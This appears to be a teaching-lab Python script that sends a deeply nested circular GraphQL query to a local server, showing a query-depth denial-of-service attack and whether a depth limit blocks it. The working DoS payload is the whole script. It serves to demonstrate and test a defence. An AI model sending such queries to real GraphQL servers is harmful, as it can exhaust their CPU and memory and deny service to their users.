"""
Depth / Circular DoS Attack — "The Never-Ending Loop"
======================================================
Sends a single deeply nested query that follows the circular
User → posts → Post → author → User relationship 8 levels deep.
Without a depth limit this forces the server into thousands of DB lookups.

Run against VULNERABLE server:  SECURE_MODE=false  → server accepts, processes all levels
Run against SECURED   server:   SECURE_MODE=true   → rejected at depth > 5
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import time
import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE = "http://localhost:5001"

# 8-level deep circular query: user → posts → author → posts → author → posts → author → username
DEEP_QUERY = """
{
  user(id: 1) {
    username
    posts {
      title
      author {
        username
        posts {
          title
          author {
            username
            posts {
              title
              author {
                username
              }
            }
          }
        }
      }
    }
  }
}
"""


def run_attack(label: str):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  DEPTH / CIRCULAR DoS ATTACK  [{label}]")
    print(f"{'='*60}{Style.RESET_ALL}")
    print("Sending 8-level nested circular query (user→posts→author×3) ...\n")

    start = time.time()
    r = requests.post(
        f"{BASE}/graphql",
        json={"query": DEEP_QUERY},
        timeout=30,
    )
    elapsed = time.time() - start

    print(f"  HTTP status  : {r.status_code}")
    print(f"  Response time: {elapsed:.3f}s")

    if r.status_code == 400:
        err = r.json().get("errors", [{}])[0].get("message", "")
        print(f"\n{Fore.GREEN}[RESULT] ATTACK BLOCKED — server returned 400{Style.RESET_ALL}")
        print(f"  Server message: {err}")
        return

    data = r.json()
    if "errors" in data:
        print(f"\n{Fore.GREEN}[RESULT] ATTACK BLOCKED — errors in response{Style.RESET_ALL}")
        print(f"  {data['errors'][0]['message']}")
        return

    print(f"\n{Fore.RED}[RESULT] ATTACK ACCEPTED — server processed the deep query in {elapsed:.3f}s{Style.RESET_ALL}")
    print(f"  Without a depth limit, a 15-20 level query would exhaust server CPU/RAM.")
    print(f"  Response keys: {list(data.get('data', {}).keys())}")


if __name__ == "__main__":
    run_attack("live server")
